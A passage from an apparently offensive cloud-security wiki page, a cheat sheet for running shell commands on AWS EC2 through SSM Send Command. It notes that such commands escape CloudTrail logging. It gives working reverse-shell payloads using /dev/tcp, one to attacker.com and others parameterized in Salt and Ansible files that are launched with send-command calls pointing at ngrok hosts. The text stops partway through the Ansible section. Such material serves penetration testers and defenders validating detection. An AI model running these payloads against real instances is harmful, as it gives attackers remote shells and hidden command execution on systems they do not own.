md-nav__item--active"> <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc"> <label class="md-nav__link md-nav__link--active" for="__toc"> <span class="md-ellipsis"> Run Shell Commands on EC2 with Send Command or Session Manager </span> <span class="md-nav__icon md-icon"></span> </label> <a href="./" class="md-nav__link md-nav__link--active"> <span class="md-ellipsis"> Run Shell Commands on EC2 with Send Command or Session Manager </span> </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class="md-nav__title" for="__toc"> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix> <li class="md-nav__item"> <a href="#send-command" class="md-nav__link"> <span class="md-ellipsis"> Send Command </span> </a> <nav class="md-nav" aria-label="Send Command"> <ul class="md-nav__list"> <li class="md-nav__item"> <a href="#advanced-attacks" class="md-nav__link"> <span class="md-ellipsis"> Advanced Attacks </span> </a> <nav class="md-nav" aria-label="Advanced Attacks"> <ul class="md-nav__list"> <li class="md-nav__item"> <a href="#upgrade-to-a-shell" class="md-nav__link"> <span class="md-ellipsis"> Upgrade to a shell </span> </a> </li> <li class="md-nav__item"> <a href="#using-other-ssm-documents" class="md-nav__link"> <span class="md-ellipsis"> Using other SSM Documents </span> </a> <nav class="md-nav" aria-label="Using other SSM Documents"> <ul class="md-nav__list"> <li class="md-nav__item"> <a href="#aws-runsaltstate" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunSaltState </span> </a> </li> <li class="md-nav__item"> <a href="#aws-applyansibleplaybooks" class="md-nav__link"> <span class="md-ellipsis"> AWS-ApplyAnsiblePlaybooks </span> </a> </li> <li class="md-nav__item"> <a href="#aws-runansibleplaybook" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunAnsiblePlaybook </span> </a> </li> <li class="md-nav__item"> <a href="#aws-installpowershellmodule" class="md-nav__link"> <span class="md-ellipsis"> AWS-InstallPowerShellModule </span> </a> </li> <li class="md-nav__item"> <a href="#aws-installapplication" class="md-nav__link"> <span class="md-ellipsis"> AWS-InstallApplication </span> </a> </li> <li class="md-nav__item"> <a href="#aws-runremotescript" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunRemoteScript </span> </a> </li> <li class="md-nav__item"> <a href="#aws-rundocument" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunDocument </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item"> <a href="#session-manager" class="md-nav__link"> <span class="md-ellipsis"> Session Manager </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a href="../s3_acl_persistence/" class="md-nav__link"> <span class="md-ellipsis"> S3 File ACL Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../survive_access_key_deletion_with_sts_getfederationtoken/" class="md-nav__link"> <span class="md-ellipsis"> Survive Access Key Deletion with sts:GetFederationToken </span> </a> </li> <li class="md-nav__item"> <a href="../user_data_script_persistence/" class="md-nav__link"> <span class="md-ellipsis"> User Data Script Persistence </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6"> <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0"> <span class="md-ellipsis"> Deprecated </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_6"> <span class="md-nav__icon md-icon"></span> Deprecated </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../deprecated/stealth_perm_enum/" class="md-nav__link"> <span class="md-ellipsis"> [Deprecated] Enumerate Permissions without Logging to CloudTrail </span> </a> </li> <li class="md-nav__item"> <a href="../../deprecated/whoami/" class="md-nav__link"> <span class="md-ellipsis"> [Deprecated] Whoami - Get Principal Name From Keys </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7"> <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0"> <span class="md-ellipsis"> Capture the Flag </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_7"> <span class="md-nav__icon md-icon"></span> Capture the Flag </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../capture_the_flag/cicdont/" class="md-nav__link"> <span class="md-ellipsis"> CI/CDon't </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3"> <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0"> <span class="md-ellipsis"> Azure </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_3"> <span class="md-nav__icon md-icon"></span> Azure </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../azure/abusing-managed-identities/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Managed Identities </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/anonymous-blob-access/" class="md-nav__link"> <span class="md-ellipsis"> Anonymous Blob Access </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/enum_email_addresses/" class="md-nav__link"> <span class="md-ellipsis"> Unauthenticated Enumeration of Azure Active Directory Email Addresses </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/run-command-abuse/" class="md-nav__link"> <span class="md-ellipsis"> Run Command Abuse </span> </a> </li> <li class="md-nav__item"> <a href="../../../azure/soft-deleted-blobs/" class="md-nav__link"> <span class="md-ellipsis"> Soft Deleted Blobs </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4"> <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0"> <span class="md-ellipsis"> GCP </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4"> <span class="md-nav__icon md-icon"></span> GCP </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1"> <label class="md-nav__link" for="__nav_4_1" id="__nav_4_1_label" tabindex="0"> <span class="md-ellipsis"> General Knowledge </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_1"> <span class="md-nav__icon md-icon"></span> General Knowledge </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/default-account-names/" class="md-nav__link"> <span class="md-ellipsis"> Default Account Information </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/gcp-buckets/" class="md-nav__link"> <span class="md-ellipsis"> Hunting GCP Buckets </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/metadata_in_google_cloud_instances/" class="md-nav__link"> <span class="md-ellipsis"> Metadata in Google Cloud Instances </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/general-knowledge/security-and-constraints/" class="md-nav__link"> <span class="md-ellipsis"> Security and Constraints </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2"> <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_2"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/enumeration/enum_email_addresses/" class="md-nav__link"> <span class="md-ellipsis"> Unauthenticated Enumeration of Google Workspace Email Addresses </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/enumeration/enumerate_all_permissions/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate Org/Folder/Project Permissions + Individual Resource Permissions </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/enumeration/enumerate_service_account_permissions/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate Service Account Permissions </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3"> <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_3"> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/exploitation/gcp_iam_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> Privilege Escalation in Google Cloud Platform </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/exploitation/tagbindings_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> Tag Your Way In - GCP Privilege Escalation Using Tags </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4"> <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0"> <span class="md-ellipsis"> Avoid Detection </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_4"> <span class="md-nav__icon md-icon"></span> Avoid Detection </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/avoid-detection/apps-script-abuse/" class="md-nav__link"> <span class="md-ellipsis"> Apps Script project impersonation / Google Apps Script persistence </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5"> <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0"> <span class="md-ellipsis"> Capture the Flag </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_4_5"> <span class="md-nav__icon md-icon"></span> Capture the Flag </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../gcp/capture_the_flag/gcp-goat/" class="md-nav__link"> <span class="md-ellipsis"> GCP Goat </span> </a> </li> <li class="md-nav__item"> <a href="../../../gcp/capture_the_flag/thunder_ctf/" class="md-nav__link"> <span class="md-ellipsis"> Thunder CTF </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5"> <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0"> <span class="md-ellipsis"> AI and LLM </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_5"> <span class="md-nav__icon md-icon"></span> AI and LLM </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1"> <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_5_1"> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../ai-llm/exploitation/claude_magic_string_denial_of_service/" class="md-nav__link"> <span class="md-ellipsis"> Break LLM Workflows with Claude's Refusal Magic String </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6"> <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0"> <span class="md-ellipsis"> Terraform </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_6"> <span class="md-nav__icon md-icon"></span> Terraform </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../terraform/terraform_ansi_escape_evasion/" class="md-nav__link"> <span class="md-ellipsis"> Terraform ANSI Escape </span> </a> </li> <li class="md-nav__item"> <a href="../../../terraform/terraform_enterprise_metadata_service/" class="md-nav__link"> <span class="md-ellipsis"> Terraform Enterprise: Attack the Metadata Service </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7"> <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0"> <span class="md-ellipsis"> Blog </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_7"> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../../blog/call_for_ai_research/" class="md-nav__link"> <span class="md-ellipsis"> Call for research: AI and LLM security </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2025_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2025 Hacking the Cloud: Year in Review </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2024_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2024 Cloud Security Highlights: Hacking the Cloudâ€™s Year in Review </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2023_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2023 Wrap-up </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/2022_wrap-up/" class="md-nav__link"> <span class="md-ellipsis"> 2022 Wrap-up </span> </a> </li> <li class="md-nav__item"> <a href="../../../blog/v2_new_look/" class="md-nav__link"> <span class="md-ellipsis"> Hacking The Cloud v2: New Look </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class="md-nav__title" for="__toc"> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix> <li class="md-nav__item"> <a href="#send-command" class="md-nav__link"> <span class="md-ellipsis"> Send Command </span> </a> <nav class="md-nav" aria-label="Send Command"> <ul class="md-nav__list"> <li class="md-nav__item"> <a href="#advanced-attacks" class="md-nav__link"> <span class="md-ellipsis"> Advanced Attacks </span> </a> <nav class="md-nav" aria-label="Advanced Attacks"> <ul class="md-nav__list"> <li class="md-nav__item"> <a href="#upgrade-to-a-shell" class="md-nav__link"> <span class="md-ellipsis"> Upgrade to a shell </span> </a> </li> <li class="md-nav__item"> <a href="#using-other-ssm-documents" class="md-nav__link"> <span class="md-ellipsis"> Using other SSM Documents </span> </a> <nav class="md-nav" aria-label="Using other SSM Documents"> <ul class="md-nav__list"> <li class="md-nav__item"> <a href="#aws-runsaltstate" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunSaltState </span> </a> </li> <li class="md-nav__item"> <a href="#aws-applyansibleplaybooks" class="md-nav__link"> <span class="md-ellipsis"> AWS-ApplyAnsiblePlaybooks </span> </a> </li> <li class="md-nav__item"> <a href="#aws-runansibleplaybook" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunAnsiblePlaybook </span> </a> </li> <li class="md-nav__item"> <a href="#aws-installpowershellmodule" class="md-nav__link"> <span class="md-ellipsis"> AWS-InstallPowerShellModule </span> </a> </li> <li class="md-nav__item"> <a href="#aws-installapplication" class="md-nav__link"> <span class="md-ellipsis"> AWS-InstallApplication </span> </a> </li> <li class="md-nav__item"> <a href="#aws-runremotescript" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunRemoteScript </span> </a> </li> <li class="md-nav__item"> <a href="#aws-rundocument" class="md-nav__link"> <span class="md-ellipsis"> AWS-RunDocument </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item"> <a href="#session-manager" class="md-nav__link"> <span class="md-ellipsis"> Session Manager </span> </a> </li> </ul> </nav> </div> </div> </div> <div class="md-content" data-md-component="content"> <article class="md-content__inner md-typeset"> <p>Article by Nick Frichette</p> <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud/edit/main/content/aws/post_exploitation/run_shell_commands_on_ec2.md" title="Edit this page" class="md-content__button md-icon" rel="edit"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"></path></svg> </a> <h1>Run Shell Commands on EC2 with Send Command or Session Manager</h1> <p>After escalating privileges in a target AWS account or otherwise gaining privileged access you may want to run commands on EC2 instances in the account. This article hopes to provide a quick and referenceable cheat sheet on how to do this via <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ssm/send-command.html">ssm:SendCommand</a> or <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ssm/start-session.html">ssm:StartSession</a>.</p> <div class="admonition tip"> <p class="admonition-title">Tip</p> <p>By default, the commands that are issued are not logged to CloudTrail. Specifically they are "HIDDEN_DUE_TO_SECURITY_REASONS". As a result, if an adversary were to leverage this tactic against an environment, defenders would need to get information about those commands from host based controls. Defenders, this is an excellent capability to validate. Alternatively, offensive security teams can do the testing.</p> </div> <h2 id="send-command">Send Command<a class="headerlink" href="#send-command" title="Permanent link">Â¶</a></h2> <div class="grid cards"> <ul> <li> <p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6 0 1.2.6 1.2 1.3v3.5c0 .6-.6 1.2-1.3 1.2H9.2c-.6 0-1.2-.6-1.2-1.3v-3.5c0-.6.6-1.2 1.2-1.2V9.5C9.2 8.1 10.6 7 12 7m0 1.2c-.8 0-1.5.5-1.5 1.3V11h3V9.5c0-.8-.7-1.3-1.5-1.3"></path></svg></span> <strong>Required IAM Permissions</strong></p> <hr> <ul> <li><a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ssm/send-command.html">ssm:SendCommand</a></li> </ul> </li> <li> <p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 20v2.97h-2V20h-3v-2h3v-3h2v3h3v2zM12 1l9 4v6c0 .9-.1 1.78-.29 2.65A5.8 5.8 0 0 0 18 13a6 6 0 0 0-6 6c0 1.36.45 2.62 1.22 3.62L12 23c-5.16-1.26-9-6.45-9-12V5z"></path></svg></span> <strong>Recommended but not Required IAM Permissions</strong></p> <hr> <ul> <li><a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ssm/list-command-invocations.html">ssm:ListCommandInvocations</a></li> <li><a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ec2/describe-instances.html">ec2:DescribeInstances</a></li> </ul> </li> </ul> </div> <p>You can send arbitrary shell commands to EC2 instances from the AWS CLI via the following:</p> <div class="highlight"><pre><span></span><code>aws ssm send-command \
--instance-ids "i-00000000000000000" \
--document-name "AWS-RunShellScript"
--parameters commands="*shell commands here*"
</code></pre></div> <p>If you're just looking to run a quick C2 payload, or perhaps create a new user this will likely be enough. However, if you also want to retrieve the output of the command you will need to make a <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/ssm/list-command-invocations.html">ssm:ListCommandInvocations</a> call as well.</p> <p>If you would like to retrieve the output, make a note of the <code>CommandId</code> returned to you in the Send Command call. After a short period of time (to let the command run) you can use this Id to lookup the results. You can do this with the following:</p> <div class="highlight"><pre><span></span><code>aws ssm list-command-invocations \
--command-id "command_id_guid" \
--details
</code></pre></div> <div class="admonition note"> <p class="admonition-title">Note</p> <p>The <code>--details</code> is required to view the output of the command.</p> </div> <p>The output of the command will be in the <code>Output</code> section under <code>CommandPlugins</code>.</p> <h3 id="advanced-attacks">Advanced Attacks<a class="headerlink" href="#advanced-attacks" title="Permanent link">Â¶</a></h3> <p>Section author: Eduard Agavriloae</p> <div class="grid cards"> <ul> <li> <p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m21.71 20.29-1.42 1.42a1 1 0 0 1-1.41 0L7 9.85A3.8 3.8 0 0 1 6 10a4 4 0 0 1-3.78-5.3l2.54 2.54.53-.53 1.42-1.42.53-.53L4.7 2.22A4 4 0 0 1 10 6a3.8 3.8 0 0 1-.15 1l11.86 11.88a1 1 0 0 1 0 1.41M2.29 18.88a1 1 0 0 0 0 1.41l1.42 1.42a1 1 0 0 0 1.41 0l5.47-5.46-2.83-2.83M20 2l-4 2v2l-2.17 2.17 2 2L18 8h2l2-4Z"></path></svg></span> <strong>Tools mentioned in this article</strong></p> <hr> <p><a href="https://github.com/saw-your-packet/EC2StepShell">EC2StepShell</a>: EC2StepShell is an AWS post-exploitation tool for getting high privileges reverse shells in public or private EC2 instances.</p> <p><a href="https://github.com/saw-your-packet/fun-with-ssm">fun-with-ssm</a>: Resources for AWS post-exploitation scenarios where you have the permission ssm:SendCommand, but you can't use the AWS-RunPowerShellScript or AWS-RunShellScript documents.</p> </li> </ul> </div> <h4 id="upgrade-to-a-shell">Upgrade to a shell<a class="headerlink" href="#upgrade-to-a-shell" title="Permanent link">Â¶</a></h4> <p>If you don't have the ssm:StartSession permission, but you still want something close to a reverse shell, then you can use EC2StepShell.</p> <div class="admonition tip"> <p class="admonition-title">Tip</p> <p>EC2StepShell works on both Windows-UNIX and public-private instances. The tool automatically detect the OS and uses the permissions "ssm:SendCommand" for sending commands and either "ssm:GetCommandInvocation" or "ssm:ListCommandInvocations" for retrieving the output.</p> </div> <p>The tool is just a wrapper over SSM SendCommand, but it makes command execution simpler and it helps in showing impact.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/post_exploitation/run_shell_commands_on_ec2/ec2stepshell-usage.png" data-desc-position="bottom"><img alt="ec2stepshell-usage" src="../../../images/aws/post_exploitation/run_shell_commands_on_ec2/ec2stepshell-usage.png"></a></p> <h4 id="using-other-ssm-documents">Using other SSM Documents<a class="headerlink" href="#using-other-ssm-documents" title="Permanent link">Â¶</a></h4> <p>Most techniques and tools are using the SSM Documents AWS-RunShellScript and AWS-RunPowerShellScript for executing system commands. In some cases this might be either blocked or heavily monitored. Similarly, execution of SSM Documents owned by other AWS accounts might have the same restrictions.</p> <p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../../../images/aws/post_exploitation/run_shell_commands_on_ec2/deny-ssm-documents.png" data-desc-position="bottom"><img alt="deny-ssm-documents" src="../../../images/aws/post_exploitation/run_shell_commands_on_ec2/deny-ssm-documents.png"></a></p> <p>There are 7 other SSM Documents that can be used for executing system commands on EC2 instances as first documented in the blog post <a href="https://securitycafe.ro/2023/04/19/7-lesser-known-aws-ssm-document-techniques-for-code-execution/">7 Lesser-Known AWS SSM Document Techniques for Code Execution</a>.</p> <h5 id="aws-runsaltstate">AWS-RunSaltState<a class="headerlink" href="#aws-runsaltstate" title="Permanent link">Â¶</a></h5> <p>This document will download from a remote location a Salt state file and interpret it. Salt state files are part of SaltStack, a technology for infrastructure management. The file format is YAML and the AWS-RunSaltState document can download it from S3 Buckets or HTTP(S) servers.</p> <p>The payload for running arbitrary code will use â€œcmd.runâ€, as exemplified below where we have a payload for getting a reverse shell.</p> <div class="highlight"><pre><span></span><code><span class="nt">mycommand</span><span class="p">:</span>
<span class="w">  </span><span class="nt">cmd.run</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attacker.com/1337; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span>
</code></pre></div> <p>The downside is that Salt Stack needs to be installed on the target system and thatâ€™s not the case by default.</p> <p>For this document, as well as for the rest of them, we can create parameterized payloads. Meaning that we will use a single generic payload and pass the host and port as parameters.</p> <div class="highlight"><pre><span></span><code><span class="c1"># source: https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-RunSaltState/linux/reverse_shell.yml</span>
<span class="nt">mycommand</span><span class="p">:</span>
<span class="w">  </span><span class="nt">cmd.run</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/{{host}}/{{port}}; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span>
</code></pre></div> <p>Example usage:</p> <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--document-name<span class="w"> </span>AWS-RunSaltState<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--instance-id<span class="w"> </span>i-06ae9883fe6e5d721<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="se">\</span>
<span class="s1">'{"stateurl":["https://raw.githubusercontent.com/saw-your-packet/fun-with-ssm/main/AWS-RunSaltState/linux/reverse_shell.yml"], "pillars":["{\"host\":\"7.tcp.eu.ngrok.io\", \"port\":\"14460\"}"]}'</span>
</code></pre></div> <h5 id="aws-applyansibleplaybooks">AWS-ApplyAnsiblePlaybooks<a class="headerlink" href="#aws-applyansibleplaybooks" title="Permanent link">Â¶</a></h5> <p>It downloads from remote locations Ansible Playbooks and executes them. It can download from S3 Buckets or GitHub repositories.</p> <p>The advantage here is that it can also install Ansible on the system.</p> <p>The parameterized Ansible Playbook for getting a reverse shell:</p> <div class="highlight"><pre><span></span><code><span class="c1"># Source: https://github.com/saw-your-packet/fun-with-ssm/blob/main/AWS-ApplyAnsiblePlaybooks/linux/reverse_shell.yml</span>
<span class="nn">---</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">"Playing</span><span class="nv"> </span><span class="s">with</span><span class="nv"> </span><span class="s">Ansible</span><span class="nv"> </span><span class="s">and</span><span class="nv"> </span><span class="s">Git"</span>
<span class="w">    </span><span class="nt">hosts</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">localhost</span>
<span class="w">    </span><span class="nt">connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">local</span><span class="w"> </span>
<span class="w">    </span><span class="nt">tasks</span><span class="p">:</span>

<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">"Saying</span><span class="nv"> </span><span class="s">hi</span><span class="nv"> </span><span class="s">from</span><span class="nv"> </span><span class="s">remote</span><span class="nv"> </span><span class="s">host"</span>
<span class="w">      </span><span class="nt">shell</span><span class="p">:</span><span class="w"> </span><span class="s">"0&lt;&amp;196;exec</span><span class="nv"> </span><span class="s">196&lt;&gt;/dev/tcp/{{host}}/{{port}};</span><span class="nv"> </span><span class="s">sh</span><span class="nv"> </span><span class="s">&lt;&amp;196</span><span class="nv"> </span><span class="s">&gt;&amp;196</span><span class="nv"> </span><span class="s">2&gt;&amp;196"</span>
</code></pre></div> <p>Example usage:</p> <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>ssm<span class="w"> </span>send-command<span class="w"> </span>--instance-id<span class="w"> </span>i-0ecad5485f77f18f4<span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--document-name<span class="w"> </span><span class="s2">"AWS-ApplyAnsiblePlaybooks"</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>--parameters<span class="w"> </span><span class="se">\</span>
<span class="s1">'{"SourceType":["GitHub"],"SourceInfo":["{\"owner\":\"saw-your-packet\", \"repository\":\"fun-with-ssm\",\"path\":\"AWS-ApplyAnsiblePlaybooks/linux/\", \"getOptions\":\"branch:main\"}"],"InstallDependencies":["True"],"PlaybookFile":["reverse_shell.yml"],"ExtraVariables":["host=6.tcp.eu.ngrok.io port=13012"]}'</span>
